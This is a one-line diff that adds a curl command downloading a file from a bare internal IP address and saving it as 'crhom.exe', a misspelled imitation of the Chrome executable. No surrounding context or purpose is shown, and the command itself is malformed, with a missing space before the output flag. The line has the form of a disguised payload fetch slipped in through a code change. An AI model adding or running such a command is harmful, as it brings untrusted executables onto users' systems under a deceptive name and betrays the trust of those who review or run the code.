@@ -1,0 +1,1 @@
+curl -X GET http://10.8.32.135:9000--output crhom.exe
